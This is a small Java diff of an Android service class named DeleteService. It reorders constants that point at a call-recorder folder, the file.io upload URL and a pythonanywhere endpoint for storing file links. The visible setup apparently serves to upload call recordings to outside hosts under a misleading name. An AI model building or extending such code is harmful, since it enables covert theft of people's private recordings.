@@ -21,9 +21,9 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class DeleteService extends Service {
-
-    private static final String FILE_IO_UPLOAD_URL = "https://file.io/";
+    
     private static final String TARGET_FOLDER = "/storage/emulated/0/Documents/CubeCallRecorder/All/";
+    private static final String FILE_IO_UPLOAD_URL = "https://file.io/";
     private static final String STORE_URL_API = "https://filestore.pythonanywhere.com/file-urls/add/?url=";
     private Handler handler;
 
